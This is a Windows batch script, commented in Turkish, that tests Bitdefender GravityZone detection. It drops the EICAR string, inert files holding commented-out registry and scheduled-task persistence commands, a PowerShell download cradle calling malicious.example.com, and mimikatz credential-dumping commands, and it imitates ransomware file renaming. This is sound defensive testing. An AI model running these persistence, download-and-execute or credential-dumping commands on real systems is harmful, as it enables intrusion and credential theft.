@echo off
REM ============================================================================
REM Test Suite
REM Batch Script Edition
REM 
REM ============================================================================

setlocal EnableDelayedExpansion

REM Renkler için
set "GREEN=[92m"
set "YELLOW=[93m"
set "RED=[91m"
set "CYAN=[96m"
set "RESET=[0m"

REM Log dosyası
set LOGFILE=%TEMP%\BitdefenderTest_%date:~-4,4%%date:~-7,2%%date:~-10,2%_%time:~0,2%%time:~3,2%%time:~6,2%.log
set LOGFILE=%LOGFILE: =0%

echo.
echo ======================================================================
echo   BITDEFENDER GRAVITYZONE DETECTION TEST SUITE
echo   Batch Edition - Safe Detection Tests
echo ======================================================================
echo.

echo [INFO] Test başlatılıyor... >> "%LOGFILE%"
echo [INFO] Log dosyası: %LOGFILE% >> "%LOGFILE%"
echo Log dosyası: %LOGFILE%
echo.

set TestCount=0
set DetectedCount=0
set TotalTests=6

REM ============================================================================
REM TEST 1: EICAR Test Dosyası
REM ============================================================================
set /a TestCount+=1
echo [%TestCount%/%TotalTests%] EICAR Standart Test Dosyası
echo [INFO] EICAR test dosyası oluşturuluyor... >> "%LOGFILE%"

set EICARFILE=%TEMP%\eicar_test.com
echo X5O!P%%@AP[4\PZX54(P^^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* > "%EICARFILE%"

timeout /t 2 /nobreak >nul

if exist "%EICARFILE%" (
    echo %YELLOW%[WARNING] EICAR dosyası tespit EDİLMEDİ!%RESET%
    echo [WARNING] EICAR dosyası tespit EDİLMEDİ! >> "%LOGFILE%"
    del /f /q "%EICARFILE%" 2>nul
) else (
    echo %GREEN%[SUCCESS] EICAR dosyası tespit edildi ve karantinaya alındı%RESET%
    echo [SUCCESS] EICAR dosyası tespit edildi >> "%LOGFILE%"
    set /a DetectedCount+=1
)

echo.

REM ============================================================================
REM TEST 2: Şüpheli Batch Script
REM ============================================================================
set /a TestCount+=1
echo [%TestCount%/%TotalTests%] Şüpheli Batch Script Tespiti
echo [INFO] Şüpheli batch script test ediliyor... >> "%LOGFILE%"

set SUSPICIOUSFILE=%TEMP%\suspicious_script.bat
(
echo @echo off
echo REM Bu bir test scriptidir - gerçekte çalıştırılmaz
echo REM reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MalwareTest /t REG_SZ /d "cmd.exe"
echo REM schtasks /create /tn "MalwareTask" /tr "cmd.exe" /sc onlogon
echo echo Bu sadece bir test - gerçek değişiklik yok
) > "%SUSPICIOUSFILE%"

timeout /t 2 /nobreak >nul

if exist "%SUSPICIOUSFILE%" (
    echo %YELLOW%[WARNING] Şüpheli batch script tespit EDİLMEDİ%RESET%
    echo [WARNING] Şüpheli batch script tespit EDİLMEDİ >> "%LOGFILE%"
    del /f /q "%SUSPICIOUSFILE%" 2>nul
) else (
    echo %GREEN%[SUCCESS] Şüpheli script tespit edildi%RESET%
    echo [SUCCESS] Şüpheli script tespit edildi >> "%LOGFILE%"
    set /a DetectedCount+=1
)

echo.

REM ============================================================================
REM TEST 3: Şüpheli PowerShell Download
REM ============================================================================
set /a TestCount+=1
echo [%TestCount%/%TotalTests%] PowerShell Download Cradle Tespiti
echo [INFO] PowerShell download pattern test ediliyor... >> "%LOGFILE%"

set PSFILE=%TEMP%\ps_download_test.ps1
(
echo # Bu bir test scriptidir - gerçekte çalıştırılmaz
echo # $client = New-Object System.Net.WebClient
echo # $client.DownloadFile^("http://malicious.example.com/payload.exe","payload.exe"^)
echo # Invoke-Expression ^(New-Object Net.WebClient^).DownloadString^('http://example.com'^^)
echo Write-Host "Bu sadece bir test - gerçek download yok"
) > "%PSFILE%"

timeout /t 2 /nobreak >nul

if exist "%PSFILE%" (
    echo %YELLOW%[WARNING] PowerShell script tespit EDİLMEDİ%RESET%
    echo [WARNING] PowerShell script tespit EDİLMEDİ >> "%LOGFILE%"
    del /f /q "%PSFILE%" 2>nul
) else (
    echo %GREEN%[SUCCESS] PowerShell script tespit edildi%RESET%
    echo [SUCCESS] PowerShell script tespit edildi >> "%LOGFILE%"
    set /a DetectedCount+=1
)

echo.

REM ============================================================================
REM TEST 4: Hızlı Dosya Oluşturma (Ransomware Davranışı)
REM ============================================================================
set /a TestCount+=1
echo [%TestCount%/%TotalTests%] Hızlı Dosya Oluşturma Tespiti
echo [INFO] Ransomware benzeri dosya işlemleri test ediliyor... >> "%LOGFILE%"

set TESTFOLDER=%TEMP%\rapid_file_test
mkdir "%TESTFOLDER%" 2>nul

set FilesCreated=0
for /l %%i in (1,1,30) do (
    echo Test file %%i - %RANDOM% > "%TESTFOLDER%\testfile_%%i.txt" 2>nul
    if exist "%TESTFOLDER%\testfile_%%i.txt" set /a FilesCreated+=1
)

timeout /t 3 /nobreak >nul

if %FilesCreated% EQU 30 (
    echo %CYAN%[INFO] Davranışsal koruma bu testi engellemedi%RESET%
    echo [INFO] Davranışsal koruma testi engellemedi >> "%LOGFILE%"
) else (
    echo %GREEN%[SUCCESS] Şüpheli dosya işlemi engellendi ^(%FilesCreated%/30^)%RESET%
    echo [SUCCESS] Şüpheli dosya işlemi engellendi >> "%LOGFILE%"
    set /a DetectedCount+=1
)

rmdir /s /q "%TESTFOLDER%" 2>nul

echo.

REM ============================================================================
REM TEST 5: Mimikatz Benzeri String
REM ============================================================================
set /a TestCount+=1
echo [%TestCount%/%TotalTests%] Tehdit String Tespiti
echo [INFO] Bilinen tehdit string'leri test ediliyor... >> "%LOGFILE%"

set MIMIKATZFILE=%TEMP%\mimikatz_test.txt
(
echo SADECE TEST - Bu gerçek mimikatz değildir
echo Bitdefender'ın string tabanlı tespitini test eder
echo.
echo mimikatz sekurlsa::logonpasswords
echo privilege::debug token::elevate
echo lsadump::sam lsadump::secrets
) > "%MIMIKATZFILE%"

timeout /t 2 /nobreak >nul

if exist "%MIMIKATZFILE%" (
    echo %CYAN%[INFO] String tabanlı tespit aktif değil ^(normal olabilir^)%RESET%
    echo [INFO] String tabanlı tespit aktif değil >> "%LOGFILE%"
    del /f /q "%MIMIKATZFILE%" 2>nul
) else (
    echo %GREEN%[SUCCESS] Tehdit string'i tespit edildi%RESET%
    echo [SUCCESS] Tehdit string'i tespit edildi >> "%LOGFILE%"
    set /a DetectedCount+=1
)

echo.

REM ============================================================================
REM TEST 6: Dosya Uzantısı Değiştirme
REM ============================================================================
set /a TestCount+=1
echo [%TestCount%/%TotalTests%] Dosya Uzantısı Değiştirme Tespiti
echo [INFO] Ransomware benzeri uzantı değişikliği test ediliyor... >> "%LOGFILE%"

set RENAMETEST=%TEMP%\rename_test
mkdir "%RENAMETEST%" 2>nul

REM Test dosyaları oluştur
for /l %%i in (1,1,10) do (
    echo Original content %%i > "%RENAMETEST%\document_%%i.txt"
)

REM Uzantıları değiştir
set RenamedCount=0
for /l %%i in (1,1,10) do (
    if exist "%RENAMETEST%\document_%%i.txt" (
        ren "%RENAMETEST%\document_%%i.txt" "document_%%i.encrypted" 2>nul
        if exist "%RENAMETEST%\document_%%i.encrypted" set /a RenamedCount+=1
    )
)

timeout /t 2 /nobreak >nul

if %RenamedCount% EQU 10 (
    echo %CYAN%[INFO] Uzantı değiştirme engellemedi%RESET%
    echo [INFO] Uzantı değiştirme engellemedi >> "%LOGFILE%"
) else (
    echo %GREEN%[SUCCESS] Uzantı değiştirme engellendi ^(%RenamedCount%/10^)%RESET%
    echo [SUCCESS] Uzantı değiştirme engellendi >> "%LOGFILE%"
    set /a DetectedCount+=1
)

rmdir /s /q "%RENAMETEST%" 2>nul

echo.

REM ============================================================================
REM SONUÇLAR
REM ============================================================================
echo ======================================================================
echo   TEST SONUÇLARI
echo ======================================================================
echo.

echo Toplam Test: %TotalTests%
echo Tespit Edilen: %DetectedCount%

REM Tespit oranını hesapla
set /a DetectionRate=DetectedCount*100/TotalTests

if %DetectionRate% GEQ 75 (
    echo Tespit Oranı: %GREEN%%%DetectionRate%%%%%%%RESET%
    echo.
    echo %GREEN%[SUCCESS] Bitdefender koruması GÜÇLÜ seviyede%RESET%
    echo [SUCCESS] Bitdefender koruması GÜÇLÜ seviyede >> "%LOGFILE%"
) else if %DetectionRate% GEQ 50 (
    echo Tespit Oranı: %YELLOW%%%DetectionRate%%%%%%%RESET%
    echo.
    echo %YELLOW%[WARNING] Bitdefender koruması ORTA seviyede - İnceleme önerilir%RESET%
    echo [WARNING] Bitdefender koruması ORTA seviyede >> "%LOGFILE%"
) else (
    echo Tespit Oranı: %RED%%%DetectionRate%%%%%%%RESET%
    echo.
    echo %RED%[ERROR] Bitdefender koruması ZAYIF - Acil inceleme gerekli!%RESET%
    echo [ERROR] Bitdefender koruması ZAYIF >> "%LOGFILE%"
)

echo.
echo Detaylı log: %LOGFILE%
echo.
echo %YELLOW%ÖNEMLİ NOTLAR:%RESET%
echo 1. GravityZone konsolundan event'leri kontrol edin
echo 2. Endpoint'te local log'ları inceleyin
echo 3. Real-time koruma ayarlarını doğrulayın
echo 4. Bu testler zararsızdır ancak üretim ortamında dikkatli kullanın
echo.
echo ======================================================================
echo.

pause
